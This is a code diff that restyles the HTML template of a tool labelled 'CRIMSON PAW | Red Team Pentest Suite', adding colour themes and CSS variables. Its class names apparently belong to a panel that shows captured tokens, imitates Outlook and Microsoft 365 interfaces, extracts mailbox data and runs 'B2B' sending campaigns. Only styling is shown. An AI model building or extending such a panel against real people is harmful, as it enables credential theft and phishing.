@@ -43,40 +43,170 @@ kw_watcher.start()
 
 HTML_TEMPLATE = r'''
 <!DOCTYPE html>
-<html lang="en">
+<html lang="en" data-theme="{{ active_theme or 'crimson' }}">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>CRIMSON PAW | Red Team Pentest Suite</title>
-    <link rel="icon" type="image/png" href="/static/img/crimson_paw_logo.png">
+    <title>{{ platform_name or 'CRIMSON PAW' }} | Red Team Pentest Suite</title>
+    <link rel="icon" type="image/png" href="{{ custom_logo_url or '/static/img/crimson_paw_logo.png' }}">
     <style>
-        :root { 
+        :root, [data-theme="crimson"] { 
             --bg-primary: #0a0709; 
             --bg-sidebar: #100b0e; 
             --bg-panel: #161014; 
             --border-color: #2e1216; 
+            --border-hover: #4e1a22;
             --text-primary: #f0ebed; 
             --text-secondary: #a49498; 
             --accent-color: #e50914; 
             --accent-hover: #ff2a35;
             --accent-glow: rgba(229, 9, 20, 0.35);
+            --accent-glow-strong: rgba(229, 9, 20, 0.65);
+            --accent-gradient: linear-gradient(135deg, #e50914, #b00710);
+            --accent-gradient-hover: linear-gradient(135deg, #ff1f2a, #cc0813);
+            --badge-bg: #261115;
+            --badge-border: #5a1c22;
+            --badge-color: #ff8b94;
             --danger: #e50914; 
             --success: #2ea043; 
         }
+
+        /* ── Cyber Blue / Metallic Cobalt ── */
+        [data-theme="blue"] {
+            --bg-primary: #050a14;
+            --bg-sidebar: #091020;
+            --bg-panel: #0d172e;
+            --border-color: #16264c;
+            --border-hover: #23407d;
+            --text-primary: #e6f0ff;
+            --text-secondary: #8da2c0;
+            --accent-color: #0084ff;
+            --accent-hover: #339cff;
+            --accent-glow: rgba(0, 132, 255, 0.35);
+            --accent-glow-strong: rgba(0, 132, 255, 0.65);
+            --accent-gradient: linear-gradient(135deg, #0084ff, #0056b3);
+            --accent-gradient-hover: linear-gradient(135deg, #339cff, #006ee6);
+            --badge-bg: #0d2244;
+            --badge-border: #1a427d;
+            --badge-color: #80bfff;
+        }
+
+        /* ── Emerald / Matrix Toxic Green ── */
+        [data-theme="green"] {
+            --bg-primary: #051208;
+            --bg-sidebar: #091c0e;
+            --bg-panel: #0e2b16;
+            --border-color: #154522;
+            --border-hover: #1e6633;
+            --text-primary: #e6ffed;
+            --text-secondary: #8dc09a;
+            --accent-color: #00e676;
+            --accent-hover: #33eb91;
+            --accent-glow: rgba(0, 230, 118, 0.35);
+            --accent-glow-strong: rgba(0, 230, 118, 0.65);
+            --accent-gradient: linear-gradient(135deg, #00c853, #009624);
+            --accent-gradient-hover: linear-gradient(135deg, #00e676, #00b248);
+            --badge-bg: #0b3318;
+            --badge-border: #14592a;
+            --badge-color: #69f0ae;
+        }
+
+        /* ── Phantom Purple / Amethyst ── */
+        [data-theme="purple"] {
+            --bg-primary: #0a0514;
+            --bg-sidebar: #120924;
+            --bg-panel: #1b0e36;
+            --border-color: #311860;
+            --border-hover: #4a2491;
+            --text-primary: #f3e8ff;
+            --text-secondary: #aa95c4;
+            --accent-color: #a855f7;
+            --accent-hover: #be7bf9;
+            --accent-glow: rgba(168, 85, 247, 0.35);
+            --accent-glow-strong: rgba(168, 85, 247, 0.65);
+            --accent-gradient: linear-gradient(135deg, #9333ea, #6b21a8);
+            --accent-gradient-hover: linear-gradient(135deg, #a855f7, #7e22ce);
+            --badge-bg: #29144d;
+            --badge-border: #4d238c;
+            --badge-color: #d8b4fe;
+        }
+
+        /* ── Solar Amber / Cyber Gold ── */
+        [data-theme="amber"] {
+            --bg-primary: #120c04;
+            --bg-sidebar: #1c1307;
+            --bg-panel: #291b0b;
+            --border-color: #4a3114;
+            --border-hover: #734c1f;
+            --text-primary: #fff8e6;
+            --text-secondary: #c4ad8d;
+            --accent-color: #f59e0b;
+            --accent-hover: #fbbf24;
+            --accent-glow: rgba(245, 158, 11, 0.35);
+            --accent-glow-strong: rgba(245, 158, 11, 0.65);
+            --accent-gradient: linear-gradient(135deg, #d97706, #b45309);
+            --accent-gradient-hover: linear-gradient(135deg, #f59e0b, #d97706);
+            --badge-bg: #3d260f;
+            --badge-border: #6b431a;
+            --badge-color: #fcd34d;
+        }
+
+        /* ── Titanium / Monochrome Slate ── */
+        [data-theme="titanium"] {
+            --bg-primary: #0a0c10;
+            --bg-sidebar: #11141a;
+            --bg-panel: #191e26;
+            --border-color: #28303d;
+            --border-hover: #3d495c;
+            --text-primary: #f1f5f9;
+            --text-secondary: #94a3b8;
+            --accent-color: #38bdf8;
+            --accent-hover: #7dd3fc;
+            --accent-glow: rgba(56, 189, 248, 0.35);
+            --accent-glow-strong: rgba(56, 189, 248, 0.65);
+            --accent-gradient: linear-gradient(135deg, #0284c7, #0369a1);
+            --accent-gradient-hover: linear-gradient(135deg, #38bdf8, #0284c7);
+            --badge-bg: #1e293b;
+            --badge-border: #334155;
+            --badge-color: #bae6fd;
+        }
+
         * { box-sizing: border-box; margin: 0; padding: 0; }
+        :root {
+            color-scheme: dark;
+        }
+
+        /* Universal Styled Scrollbar */
+        ::-webkit-scrollbar { width: 7px; height: 7px; }
+        ::-webkit-scrollbar-track { background: var(--bg-primary); }
+        ::-webkit-scrollbar-thumb { background: var(--border-color); border-radius: 4px; }
+        ::-webkit-scrollbar-thumb:hover { background: var(--accent-color); }
+        * { scrollbar-width: thin; scrollbar-color: var(--border-color) var(--bg-primary); }
+
+        /* Universal Select & Option Theming */
+        select, option, optgroup {
+            background-color: var(--bg-sidebar) !important;
+            color: var(--text-primary) !important;
+            color-scheme: dark !important;
+        }
+        select option:checked, select option:hover {
+            background-color: var(--badge-bg) !important;
+            color: var(--accent-color) !important;
+        }
+
         body { font-family: 'Segoe UI', -apple-system, BlinkMacSystemFont, Roboto, sans-serif; background: var(--bg-primary); color: var(--text-primary); display: flex; height: 100vh; overflow: hidden; }
         .sidebar { width: 240px; background: var(--bg-sidebar); border-right: 1px solid var(--border-color); display: flex; flex-direction: column; padding: 16px 0; transition: width 0.3s ease; position: relative; overflow: visible; flex-shrink: 0; z-index: 100; }
         .sidebar.collapsed { width: 68px; }
         .sidebar-header { padding: 0 20px 20px; font-size: 1.15em; font-weight: 800; color: #ffffff; border-bottom: 1px solid var(--border-color); margin-bottom: 10px; white-space: nowrap; display: flex; align-items: center; gap: 10px; cursor: pointer; }
         .sidebar.collapsed .sidebar-header { padding: 0 10px 20px; font-size: 0; justify-content: center; }
-        .toggle-btn { position: absolute; right: -13px; top: 22px; width: 26px; height: 26px; background: #1c1014; border: 1.5px solid #e50914; border-radius: 50%; cursor: pointer; display: flex; align-items: center; justify-content: center; z-index: 999; transition: all 0.2s ease; box-shadow: 0 0 12px rgba(229, 9, 20, 0.45); color: #ffffff; font-size: 10px; font-weight: 800; outline: none; user-select: none; }
-        .toggle-btn:hover { background: #e50914; color: #ffffff; box-shadow: 0 0 16px rgba(229, 9, 20, 0.7); transform: scale(1.1); }
+        .toggle-btn { position: absolute; right: -13px; top: 22px; width: 26px; height: 26px; background: var(--bg-panel); border: 1.5px solid var(--accent-color); border-radius: 50%; cursor: pointer; display: flex; align-items: center; justify-content: center; z-index: 999; transition: all 0.2s ease; box-shadow: 0 0 12px var(--accent-glow); color: #ffffff; font-size: 10px; font-weight: 800; outline: none; user-select: none; }
+        .toggle-btn:hover { background: var(--accent-color); color: #ffffff; box-shadow: 0 0 16px var(--accent-glow-strong); transform: scale(1.1); }
         .sidebar.collapsed .toggle-btn { transform: none; }
         .sidebar.collapsed .toggle-btn:hover { transform: scale(1.1); }
         .nav-item { padding: 12px 20px; cursor: pointer; display: flex; align-items: center; gap: 12px; color: var(--text-secondary); white-space: nowrap; transition: background 0.15s, color 0.15s; }
         .sidebar.collapsed .nav-item { padding: 12px 0; justify-content: center; }
-        .nav-item:hover { background: #1c1318; color: #ffffff; }
-        .nav-item.active { background: #261217; color: #ffffff; font-weight: 700; border-right: 3px solid var(--accent-color); box-shadow: inset 2px 0 8px rgba(229, 9, 20, 0.25); }
+        .nav-item:hover { background: var(--bg-panel); color: #ffffff; }
+        .nav-item.active { background: var(--border-color); color: #ffffff; font-weight: 700; border-right: 3px solid var(--accent-color); box-shadow: inset 2px 0 8px var(--accent-glow); }
         .nav-icon { width: 20px; text-align: center; }
         .nav-text { transition: opacity 0.2s; }
         .sidebar.collapsed .nav-text { opacity: 0; width: 0; }
@@ -89,34 +219,34 @@ HTML_TEMPLATE = r'''
         .card { background: var(--bg-panel); border: 1px solid var(--border-color); border-radius: 8px; padding: 24px; margin-bottom: 20px; box-shadow: 0 4px 20px rgba(0,0,0,0.4); }
         .stats-grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(200px, 1fr)); gap: 20px; margin-bottom: 30px; }
         .stat-card { background: var(--bg-panel); border: 1px solid var(--border-color); border-radius: 8px; padding: 20px; text-align: center; box-shadow: 0 4px 16px rgba(0,0,0,0.4); }
-        .stat-value { font-size: 2.2em; font-weight: 800; color: var(--accent-color); margin-bottom: 8px; text-shadow: 0 0 16px rgba(229,9,20,0.3); }
+        .stat-value { font-size: 2.2em; font-weight: 800; color: var(--accent-color); margin-bottom: 8px; text-shadow: 0 0 16px var(--accent-glow); }
         .stat-label { font-size: 0.9em; color: var(--text-secondary); }
         .btn { padding: 8px 16px; border: none; border-radius: 6px; cursor: pointer; font-weight: 600; font-size: 0.9em; white-space: nowrap; transition: all 0.15s; }
-        .btn-primary { background: linear-gradient(135deg, #e50914, #b00710); color: white; border: 1px solid rgba(255,255,255,0.15); box-shadow: 0 2px 10px rgba(229,9,20,0.4); }
-        .btn-primary:hover { background: linear-gradient(135deg, #ff1f2a, #cc0813); box-shadow: 0 4px 16px rgba(229,9,20,0.6); }
-        .btn-danger { background: #3d1419; color: #ff6b72; border: 1px solid #631c25; }
-        .btn-danger:hover { background: #e50914; color: white; }
-        .btn-secondary { background: #26161b; color: #e5dfe2; border: 1px solid #451b22; }
-        .btn-secondary:hover { background: #381921; color: white; }
+        .btn-primary { background: var(--accent-gradient); color: white; border: 1px solid rgba(255,255,255,0.15); box-shadow: 0 2px 10px var(--accent-glow); }
+        .btn-primary:hover { background: var(--accent-gradient-hover); box-shadow: 0 4px 16px var(--accent-glow-strong); }
+        .btn-danger { background: var(--badge-bg); color: var(--accent-color); border: 1px solid var(--badge-border); }
+        .btn-danger:hover { background: var(--accent-color); color: white; }
+        .btn-secondary { background: var(--bg-panel); color: var(--text-primary); border: 1px solid var(--border-color); }
+        .btn-secondary:hover { background: var(--border-hover); color: white; }
         .btn-sm { padding: 4px 8px; font-size: 0.85em; }
         .table-wrapper { overflow-x: auto; border: 1px solid var(--border-color); border-radius: 6px; }
         table { width: 100%; border-collapse: collapse; background: var(--bg-panel); min-width: 800px; }
         th, td { padding: 12px 16px; text-align: left; border-bottom: 1px solid var(--border-color); font-size: 0.9em; color: var(--text-primary); }
-        th { background: #1a1015; font-weight: 700; color: #b09ba2; font-size: 0.78em; text-transform: uppercase; letter-spacing: 0.05em; border-bottom: 1px solid #38161b; }
-        tr:hover td { background: #1f141a; }
+        th { background: var(--bg-sidebar); font-weight: 700; color: var(--text-secondary); font-size: 0.78em; text-transform: uppercase; letter-spacing: 0.05em; border-bottom: 1px solid var(--border-color); }
+        tr:hover td { background: var(--border-color); }
         .status-captured { color: var(--success); font-weight: 600; }
         .status-pending { color: #d29922; font-weight: 600; }
         .status-expired, .status-failed { color: var(--danger); font-weight: 600; }
         .action-group { display: flex; gap: 6px; }
         .modal-overlay { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.85); z-index: 1000; justify-content: center; align-items: center; }
         .modal-overlay.active { display: flex; }
-        .modal { background: #161014; border: 1px solid #38161b; border-radius: 12px; padding: 25px; width: 90%; max-width: 700px; max-height: 80vh; overflow-y: auto; color: #f0ebed; box-shadow: 0 10px 40px rgba(0,0,0,0.7); }
-        .modal-header { display: flex; justify-content: space-between; align-items: center; margin-bottom: 20px; border-bottom: 1px solid #38161b; padding-bottom: 10px; }
+        .modal { background: var(--bg-sidebar); border: 1px solid var(--border-color); border-radius: 12px; padding: 25px; width: 90%; max-width: 700px; max-height: 80vh; overflow-y: auto; color: #f0ebed; box-shadow: 0 10px 40px rgba(0,0,0,0.7); }
+        .modal-header { display: flex; justify-content: space-between; align-items: center; margin-bottom: 20px; border-bottom: 1px solid var(--border-color); padding-bottom: 10px; }
         .close-btn { background: none; border: none; font-size: 1.5em; cursor: pointer; color: #a49498; }
         .close-btn:hover { color: #ffffff; }
         .token-group { margin-bottom: 20px; }
         .token-label { font-weight: bold; color: var(--text-secondary); margin-bottom: 5px; display: block; }
-        .token-value { background: #100b0e; padding: 12px; border-radius: 6px; font-family: monospace; font-size: 0.85em; word-break: break-all; border: 1px solid #38161b; max-height: 200px; overflow-y: auto; white-space: pre-wrap; color: #f0ebed; }
+        .token-value { background: var(--bg-primary); padding: 12px; border-radius: 6px; font-family: monospace; font-size: 0.85em; word-break: break-all; border: 1px solid var(--border-color); max-height: 200px; overflow-y: auto; white-space: pre-wrap; color: #f0ebed; }
         .template-grid { display: grid; grid-template-columns: repeat(auto-fill, minmax(200px, 1fr)); gap: 16px; }
         .template-card { background: var(--bg-panel); border: 1px solid var(--border-color); border-radius: 8px; padding: 20px; text-align: center; }
         .template-icon { font-size: 2em; margin-bottom: 10px; }
@@ -133,10 +263,10 @@ HTML_TEMPLATE = r'''
         .m365-waffle:hover { background: rgba(255,255,255,0.15); }
         .m365-waffle span { width: 4px; height: 4px; background: #ffffff; border-radius: 0.5px; }
         
-        .m365-search-pill { width: 520px; max-width: 50%; height: 36px; background: #ffffff; border-radius: 4px; display: flex; align-items: center; padding: 0 14px; gap: 10px; box-shadow: 0 1px 3px rgba(0,0,0,0.12); }
+        .m365-search-pill { width: 520px; max-width: 50%; height: 36px; background: #ffffff; border-radius: 4px; display: flex; align-items: center; padding: 0 14px; gap: 10px; box-shadow: 0 1px 3px rgba(0,0,0,0.12); color-scheme: light; }
         .m365-search-pill svg { fill: #0078d4; flex-shrink: 0; }
-        .m365-search-pill input { border: none; outline: none; width: 100%; font-size: 14px; color: #323130; font-family: inherit; }
-        .m365-search-pill input::placeholder { color: #605e5c; }
+        .m365-search-pill input { border: none; outline: none; width: 100%; font-size: 14px; color: #323130 !important; font-family: inherit; background: transparent !important; color-scheme: light !important; }
+        .m365-search-pill input::placeholder { color: #605e5c !important; }
 
         .m365-suite-actions { display: flex; align-items: center; gap: 12px; margin-left: auto; }
         .m365-suite-btn { background: transparent; border: none; color: #ffffff; width: 36px; height: 36px; border-radius: 4px; display: flex; align-items: center; justify-content: center; cursor: pointer; font-size: 18px; transition: background 0.12s; }
@@ -144,7 +274,7 @@ HTML_TEMPLATE = r'''
         .m365-avatar-btn { width: 32px; height: 32px; border-radius: 50%; background: #c7e0f4; color: #004578; display: flex; align-items: center; justify-content: center; font-weight: 700; font-size: 13px; border: 1.5px solid rgba(255,255,255,0.7); cursor: pointer; user-select: none; }
 
         /* Genuine Outlook Web Compose Window */
-        .owa-compose-container { background: #ffffff; width: 880px; max-width: 95vw; height: 720px; max-height: 92vh; border-radius: 8px; box-shadow: 0 16px 48px rgba(0,0,0,0.3); display: flex; flex-direction: column; overflow: hidden; border: 1px solid #d1d5db; }
+        .owa-compose-container { background: #ffffff; width: 880px; max-width: 95vw; height: 720px; max-height: 92vh; border-radius: 8px; box-shadow: 0 16px 48px rgba(0,0,0,0.3); display: flex; flex-direction: column; overflow: hidden; border: 1px solid #d1d5db; color-scheme: light; }
         .owa-compose-header { background: #ffffff; border-bottom: 1px solid #edebe9; height: 44px; padding: 0 16px; display: flex; align-items: center; justify-content: space-between; flex-shrink: 0; user-select: none; }
         .owa-compose-title { font-size: 14.5px; font-weight: 600; color: #201f1e; display: flex; align-items: center; gap: 8px; }
         .owa-window-controls { display: flex; align-items: center; gap: 4px; }
@@ -163,11 +293,11 @@ HTML_TEMPLATE = r'''
         .owa-compose-fields { padding: 10px 18px 4px; background: #ffffff; border-bottom: 1px solid #edebe9; display: flex; flex-direction: column; gap: 6px; flex-shrink: 0; }
         .owa-field-row { display: flex; align-items: center; gap: 10px; border-bottom: 1px solid #f3f2f1; padding-bottom: 5px; }
         .owa-field-label { background: #edebe9; border: none; border-radius: 3px; font-size: 12px; font-weight: 600; color: #323130; padding: 3px 10px; cursor: pointer; min-width: 44px; text-align: center; }
-        .owa-field-input { flex: 1; border: none; outline: none; font-size: 13.5px; color: #201f1e; background: transparent; font-family: inherit; padding: 4px 0; }
+        .owa-field-input { flex: 1; border: none; outline: none; font-size: 13.5px; color: #201f1e !important; background: transparent !important; font-family: inherit; padding: 4px 0; color-scheme: light !important; }
         .owa-field-toggle { color: #0078d4; font-size: 12px; font-weight: 600; cursor: pointer; padding: 2px 6px; border-radius: 3px; }
         .owa-field-toggle:hover { background: #deecf9; }
-        .owa-subject-input { width: 100%; border: none; outline: none; font-size: 15px; font-weight: 600; color: #201f1e; padding: 8px 0; font-family: inherit; }
-        .owa-subject-input::placeholder { color: #605e5c; font-weight: 400; }
+        .owa-subject-input { width: 100%; border: none; outline: none; font-size: 15px; font-weight: 600; color: #201f1e !important; padding: 8px 0; font-family: inherit; background: transparent !important; color-scheme: light !important; }
+        .owa-subject-input::placeholder { color: #605e5c !important; font-weight: 400; }
 
         .owa-compose-editor-wrap { flex: 1; min-height: 240px; padding: 14px 20px; overflow-y: auto; background: #ffffff; display: flex; flex-direction: column; }
         .owa-rich-editor { flex: 1; min-height: 220px; outline: none; font-family: 'Segoe UI', Aptos, Calibri, sans-serif; font-size: 14px; line-height: 1.6; color: #201f1e; word-break: break-word; }
@@ -349,43 +479,43 @@ HTML_TEMPLATE = r'''
         .settings-card h4 { margin-bottom: 8px; color: #201f1e; }
 
         /* ── Extractor & Sorter Page (CRIMSON PAW THEME) ─────────── */
-        .extractor-viewport { display: flex; flex-direction: column; height: 100%; background: #0a0709; color: #f0ebed; font-family: 'Segoe UI', monospace; overflow: hidden; }
-        .extractor-top-bar { display: flex; align-items: center; justify-content: space-between; padding: 14px 24px; background: #161014; border-bottom: 1px solid #38161b; flex-shrink: 0; gap: 16px; }
+        .extractor-viewport { display: flex; flex-direction: column; height: 100%; background: var(--bg-primary); color: #f0ebed; font-family: 'Segoe UI', monospace; overflow: hidden; }
+        .extractor-top-bar { display: flex; align-items: center; justify-content: space-between; padding: 14px 24px; background: var(--bg-sidebar); border-bottom: 1px solid var(--border-color); flex-shrink: 0; gap: 16px; }
         .extractor-title { font-size: 1.1em; font-weight: 800; color: #ffffff; letter-spacing: 0.05em; display: flex; align-items: center; gap: 10px; }
         .extractor-tabs { display: flex; gap: 4px; }
-        .extractor-tab { padding: 7px 20px; border-radius: 6px 6px 0 0; cursor: pointer; font-size: 0.88em; font-weight: 700; color: #a49498; border: 1px solid transparent; border-bottom: none; transition: all 0.15s; }
-        .extractor-tab.active { background: #0a0709; color: #ffffff; border-color: #38161b; border-bottom: 2px solid #e50914; }
-        .extractor-tab:hover:not(.active) { background: #1f1418; color: #ffffff; }
-        .account-selector-pill { background: #161014; border: 1px solid #38161b; border-radius: 20px; padding: 6px 16px; font-size: 0.82em; color: #f0ebed; outline: none; cursor: pointer; max-width: 280px; }
-        .account-selector-pill:focus { border-color: #e50914; }
+        .extractor-tab { padding: 7px 20px; border-radius: 6px 6px 0 0; cursor: pointer; font-size: 0.88em; font-weight: 700; color: var(--text-secondary); border: 1px solid transparent; border-bottom: none; transition: all 0.15s; }
+        .extractor-tab.active { background: var(--bg-primary); color: #ffffff; border-color: var(--border-color); border-bottom: 2px solid var(--accent-color); }
+        .extractor-tab:hover:not(.active) { background: var(--border-color); color: #ffffff; }
+        .account-selector-pill { background: var(--bg-sidebar); border: 1px solid var(--border-color); border-radius: 20px; padding: 6px 16px; font-size: 0.82em; color: #f0ebed; outline: none; cursor: pointer; max-width: 280px; }
+        .account-selector-pill:focus { border-color: var(--accent-color); }
         .extractor-body { flex: 1; display: flex; flex-direction: column; overflow: hidden; }
         .extractor-panel { display: none; flex: 1; flex-direction: column; overflow: hidden; padding: 20px 24px; gap: 16px; }
         .extractor-panel.active { display: flex; }
         .extractor-controls-row { display: flex; align-items: flex-start; gap: 20px; flex-wrap: wrap; }
-        .category-card { background: #161014; border: 1px solid #38161b; border-radius: 10px; padding: 18px 22px; display: flex; align-items: flex-start; gap: 14px; cursor: pointer; transition: all 0.2s; min-width: 240px; flex: 1; max-width: 340px; user-select: none; box-shadow: 0 4px 14px rgba(0,0,0,0.4); }
-        .category-card:hover { border-color: #e50914; background: #1c1217; transform: translateY(-1px); }
-        .category-card.selected { border-color: #e50914; background: #261116; box-shadow: 0 0 16px rgba(229, 9, 20, 0.25); }
-        .category-checkbox { width: 20px; height: 20px; border-radius: 4px; border: 2px solid #5a1c22; display: flex; align-items: center; justify-content: center; flex-shrink: 0; margin-top: 2px; transition: all 0.15s; font-size: 13px; color: white; background: transparent; }
-        .category-card.selected .category-checkbox { background: #e50914; border-color: #e50914; }
+        .category-card { background: var(--bg-sidebar); border: 1px solid var(--border-color); border-radius: 10px; padding: 18px 22px; display: flex; align-items: flex-start; gap: 14px; cursor: pointer; transition: all 0.2s; min-width: 240px; flex: 1; max-width: 340px; user-select: none; box-shadow: 0 4px 14px rgba(0,0,0,0.4); }
+        .category-card:hover { border-color: var(--accent-color); background: var(--bg-panel); transform: translateY(-1px); }
+        .category-card.selected { border-color: var(--accent-color); background: var(--border-color); box-shadow: 0 0 16px var(--accent-glow); }
+        .category-checkbox { width: 20px; height: 20px; border-radius: 4px; border: 2px solid var(--border-color); display: flex; align-items: center; justify-content: center; flex-shrink: 0; margin-top: 2px; transition: all 0.15s; font-size: 13px; color: white; background: transparent; }
+        .category-card.selected .category-checkbox { background: var(--accent-color); border-color: var(--accent-color); }
         .category-card.selected .category-checkbox::after { content: '✓'; }
         .category-info-title { font-weight: 700; font-size: 0.95em; color: #ffffff; margin-bottom: 4px; }
-        .category-info-desc { font-size: 0.8em; color: #a49498; line-height: 1.45; }
+        .category-info-desc { font-size: 0.8em; color: var(--text-secondary); line-height: 1.45; }
         .extractor-btn-group { display: flex; gap: 10px; align-items: center; flex-wrap: wrap; }
         .ext-btn { display: flex; align-items: center; gap: 8px; padding: 9px 20px; border-radius: 8px; border: none; cursor: pointer; font-size: 0.88em; font-weight: 700; transition: all 0.15s; }
-        .ext-btn-start { background: linear-gradient(135deg, #e50914, #b00710); color: #fff; box-shadow: 0 2px 12px rgba(229, 9, 20, 0.4); }
-        .ext-btn-start:hover { background: linear-gradient(135deg, #ff1f2a, #cc0813); box-shadow: 0 0 16px rgba(229, 9, 20, 0.6); transform: translateY(-1px); }
-        .ext-btn-start:disabled { background: #261115; color: #6e5c61; cursor: not-allowed; box-shadow: none; transform: none; }
-        .ext-btn-download { background: #1c1217; color: #ff6b72; border: 1px solid #38161b; }
-        .ext-btn-download:hover { background: #261115; border-color: #e50914; color: #ffffff; }
-        .ext-btn-download:disabled { color: #5a4b4f; cursor: not-allowed; border-color: #261115; }
-        .ext-btn-reset { background: transparent; color: #a49498; border: 1px solid #38161b; }
-        .ext-btn-reset:hover { color: #ff3b45; border-color: #e50914; }
+        .ext-btn-start { background: var(--accent-gradient); color: #fff; box-shadow: 0 2px 12px var(--accent-glow); }
+        .ext-btn-start:hover { background: var(--accent-gradient); box-shadow: 0 0 16px var(--accent-glow-strong); transform: translateY(-1px); }
+        .ext-btn-start:disabled { background: var(--bg-panel); color: #6e5c61; cursor: not-allowed; box-shadow: none; transform: none; }
+        .ext-btn-download { background: var(--bg-panel); color: var(--accent-color); border: 1px solid var(--border-color); }
+        .ext-btn-download:hover { background: var(--border-color); border-color: var(--accent-color); color: #ffffff; }
+        .ext-btn-download:disabled { color: #5a4b4f; cursor: not-allowed; border-color: var(--border-color); }
+        .ext-btn-reset { background: transparent; color: var(--text-secondary); border: 1px solid var(--border-color); }
+        .ext-btn-reset:hover { color: var(--accent-color); border-color: var(--accent-color); }
         .ext-counters { display: flex; gap: 20px; align-items: center; font-size: 0.82em; font-weight: 600; font-family: 'Courier New', monospace; margin-left: auto; }
-        .ext-counter-chip { background: #161014; border: 1px solid #38161b; border-radius: 20px; padding: 5px 14px; color: #ff6b72; }
+        .ext-counter-chip { background: var(--bg-sidebar); border: 1px solid var(--border-color); border-radius: 20px; padding: 5px 14px; color: var(--accent-color); }
         .ext-counter-chip span { color: #ffffff; font-weight: 800; }
-        .terminal-pane { flex: 1; background: #0c0709; border: 1px solid #38161b; border-radius: 10px; overflow-y: auto; padding: 16px 18px; font-family: 'Courier New', Consolas, monospace; font-size: 0.82em; line-height: 1.65; min-height: 200px; box-shadow: inset 0 2px 8px rgba(0,0,0,0.6); }
+        .terminal-pane { flex: 1; background: var(--bg-primary); border: 1px solid var(--border-color); border-radius: 10px; overflow-y: auto; padding: 16px 18px; font-family: 'Courier New', Consolas, monospace; font-size: 0.82em; line-height: 1.65; min-height: 200px; box-shadow: inset 0 2px 8px rgba(0,0,0,0.6); }
         .terminal-line { display: flex; gap: 10px; animation: termFadeIn 0.1s ease; }
-        .terminal-line.header { color: #ff3b45; font-weight: 700; }
+        .terminal-line.header { color: var(--accent-color); font-weight: 700; }
         .terminal-line.success { color: #3fb950; }
         .terminal-line.warn { color: #d29922; }
         .terminal-line.error { color: #f85149; }
@@ -393,99 +523,99 @@ HTML_TEMPLATE = r'''
         .term-ts { color: #6e5c61; flex-shrink: 0; }
         .term-txt { word-break: break-all; flex: 1; }
         @keyframes termFadeIn { from { opacity: 0; transform: translateY(2px); } to { opacity: 1; transform: translateY(0); } }
-        .progress-bar-outer { height: 4px; background: #261115; border-radius: 2px; overflow: hidden; }
-        .progress-bar-inner { height: 100%; background: linear-gradient(90deg, #e50914, #ff4d58); border-radius: 2px; transition: width 0.3s ease; }
-        .sorter-upload-zone { background: #161014; border: 2px dashed #38161b; border-radius: 10px; padding: 32px; text-align: center; cursor: pointer; transition: all 0.2s; }
-        .sorter-upload-zone:hover, .sorter-upload-zone.drag-over { border-color: #e50914; background: #261116; box-shadow: 0 0 20px rgba(229, 9, 20, 0.2); }
+        .progress-bar-outer { height: 4px; background: var(--bg-panel); border-radius: 2px; overflow: hidden; }
+        .progress-bar-inner { height: 100%; background: var(--accent-gradient); border-radius: 2px; transition: width 0.3s ease; }
+        .sorter-upload-zone { background: var(--bg-sidebar); border: 2px dashed var(--border-color); border-radius: 10px; padding: 32px; text-align: center; cursor: pointer; transition: all 0.2s; }
+        .sorter-upload-zone:hover, .sorter-upload-zone.drag-over { border-color: var(--accent-color); background: var(--border-color); box-shadow: 0 0 20px var(--accent-glow); }
         .sorter-upload-zone input[type=file] { display: none; }
         .sorter-upload-icon { font-size: 2.5em; margin-bottom: 10px; }
-        .sorter-upload-label { font-size: 0.9em; color: #a49498; }
+        .sorter-upload-label { font-size: 0.9em; color: var(--text-secondary); }
         .sorter-upload-label strong { color: #ffffff; }
-        .domain-group-header { display: flex; align-items: center; gap: 10px; padding: 6px 0 4px; color: #ff3b45; font-weight: 700; font-size: 0.88em; border-bottom: 1px solid #38161b; margin-bottom: 4px; }
-        .domain-badge { background: #261115; border: 1px solid #5a1c22; border-radius: 20px; padding: 2px 10px; font-size: 0.78em; color: #ff8b94; font-weight: 700; }
+        .domain-group-header { display: flex; align-items: center; gap: 10px; padding: 6px 0 4px; color: var(--accent-color); font-weight: 700; font-size: 0.88em; border-bottom: 1px solid var(--border-color); margin-bottom: 4px; }
+        .domain-badge { background: var(--bg-panel); border: 1px solid var(--border-color); border-radius: 20px; padding: 2px 10px; font-size: 0.78em; color: var(--accent-color); font-weight: 700; }
 
         /* ── B2B Sender (CRIMSON PAW THEME) ───────────────────────── */
-        .b2b-viewport { display:flex; flex-direction:column; height:100%; background:#0a0709; color:#f0ebed; font-family:'Segoe UI',sans-serif; overflow:hidden; }
-        .b2b-top-bar { display:flex; align-items:center; background:#130a0d; border-bottom:1px solid #38161b; padding:0 18px; height:46px; gap:14px; flex-shrink:0; }
+        .b2b-viewport { display:flex; flex-direction:column; height:100%; background:var(--bg-primary); color:#f0ebed; font-family:'Segoe UI',sans-serif; overflow:hidden; }
+        .b2b-top-bar { display:flex; align-items:center; background:var(--bg-sidebar); border-bottom:1px solid var(--border-color); padding:0 18px; height:46px; gap:14px; flex-shrink:0; }
         .b2b-brand { font-size:.97em; font-weight:800; color:#ffffff; letter-spacing:.04em; white-space:nowrap; }
         .b2b-chips { display:flex; gap:7px; align-items:center; }
-        .b2b-chip { background:#241116; border:1px solid #5a1c22; border-radius:20px; padding:4px 11px; font-size:.73em; font-weight:700; color:#ff8b94; cursor:pointer; letter-spacing:.05em; transition:all .15s; white-space:nowrap; }
-        .b2b-chip:hover { background:#3d1419; border-color:#e50914; color:#ffffff; }
-        .b2b-chip-muted { background:#161014; border-color:#38161b; color:#a49498; }
-        .b2b-chip-muted:hover { border-color:#e50914; color:#ffffff; }
-        .b2b-account-select { margin-left:auto; background:#161014; border:1px solid #38161b; border-radius:20px; padding:5px 13px; font-size:.8em; color:#f0ebed; outline:none; cursor:pointer; max-width:240px; }
-        .b2b-account-select:focus { border-color:#e50914; }
-        .b2b-campaign-bar { padding:8px 18px; background:#0a0709; border-bottom:1px solid #2e1216; flex-shrink:0; }
-        .b2b-field-label { font-size:.69em; font-weight:700; color:#a49498; letter-spacing:.1em; margin-bottom:4px; }
-        .b2b-campaign-input { width:100%; background:#161014; border:1px solid #38161b; border-radius:5px; padding:7px 11px; color:#ffffff; font-size:.88em; outline:none; box-sizing:border-box; transition:border-color .15s; }
-        .b2b-campaign-input:focus { border-color:#e50914; box-shadow: 0 0 8px rgba(229, 9, 20, 0.3); }
